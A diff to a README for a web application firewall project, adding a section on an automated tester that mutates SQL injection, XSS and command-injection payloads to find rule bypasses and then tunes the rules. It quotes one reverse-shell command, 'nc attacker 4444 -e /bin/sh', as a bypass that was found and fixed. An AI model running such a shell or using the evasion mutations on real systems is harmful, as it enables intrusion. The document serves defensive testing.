@@ -52,6 +52,34 @@ The analyst turns that evidence into an incident report: at `/report` and per in
 
 **Live demo:** `bash scripts/demo.sh` builds everything, sends real benign traffic and 11 attacks through the proxy, verifies the evidence and writes the report. See [docs/DEMO.md](docs/DEMO.md) for the 10-minute walkthrough.
 
+## Autonomous evaluation engine
+
+[`sentinel-autoeval`](cmd/sentinel-autoeval) attacks the WAF on its own and decides what to try next from the WAF's own responses. It works the way published WAF testers do (GoTestWAF's placement-by-encoding matrix, WAF-A-MoLE / AdvSQLi mutation search):
+
+1. **Seeds**: 16 attacks across SQL injection, XSS, command injection and path traversal.
+2. **Placements**: each seed goes into 11 positions. Five are classic: query, form, JSON, header, cookie. Six are structural (parser-differential).
+3. **Adaptive search**: every attack the WAF blocks is kept and mutated with 10 evasion transformations (encodings, case, SQL comments, MySQL versioned comments, full-width Unicode, ...), generation after generation, until nothing caught is left to mutate.
+4. **Backend oracle**: every request is also sent to a demo app that echoes what it parsed. A block only counts against an attack that actually reached an application parameter, and a "bypass" means the payload really got through.
+5. **Auto-tuning**: detection and false positives are measured at paranoia levels 1-4, and the best point within a 0.5% false-positive budget is recommended.
+6. **Evidence and report**: blocked attacks and any bypass go into the SHA-256 hash chain. The report renders to a PDF with screenshots and keeps a run history: the tuning loop.
+
+**It found a real gap.** The first run against the v0.2 rules found 12 confirmed bypasses: reverse shells written as `nc attacker 4444 -e /bin/sh` (host and port before `-e`), plus case-swapped and comment-prefixed variants. Rule 3004 was rewritten from those findings and the four shapes were added to the regression corpus. The next run found nothing:
+
+| Run | Attacks | Reached the app | Detection | Bypasses | False positives |
+|---|---|---|---|---|---|
+| 1 — rules at `ac9c05c` | 3,817 | 364 | 96.7% | 12 | 0% |
+| 2 — after the fix | 3,817 | 364 | **100%** | **0** | 0% |
+
+Inspection latency in that run: p50 45 µs, p99 236 µs. CI runs the engine on every push and **fails the build if it finds any bypass**.
+
+**Full report (PDF, with screenshots):** [docs/Sentinel-WAF-Autonomous-Evaluation.pdf](docs/Sentinel-WAF-Autonomous-Evaluation.pdf)
+
+![Autonomous evaluation report](docs/autoeval-report.png)
+
+```bash
+go run ./cmd/sentinel-autoeval -out autoeval-out -label "my run"   # campaign + tuning + evidence + report.html
+```
+
 ## Results
 
 These are GitHub CI numbers on Linux, regenerated on every push. Download them from the `compare-results` and `gotestwaf-report` artifacts of any run.
@@ -158,6 +186,8 @@ eval/corpus        regression corpus       internal/server      proxy, rate limi
 cmd/sentinel-report verify / report     internal/parsediff   multi-parser body readings + disagreements
 bench/compare/attacklab live campaign   internal/evidence    SHA-256 hash-chained evidence vault
 scripts/demo.sh    one-command live demo   internal/analyst     technique knowledge base + incident reports
+cmd/sentinel-autoeval autonomous eval   internal/redteam     adaptive attack search, oracle, tuning, report
+                                        internal/testapp     demo backend that echoes what it parsed
 ```
 
 Project docs: [threat model](docs/THREAT_MODEL.md) · [security policy](SECURITY.md) · [changelog](CHANGELOG.md) · [demo script](docs/DEMO.md).
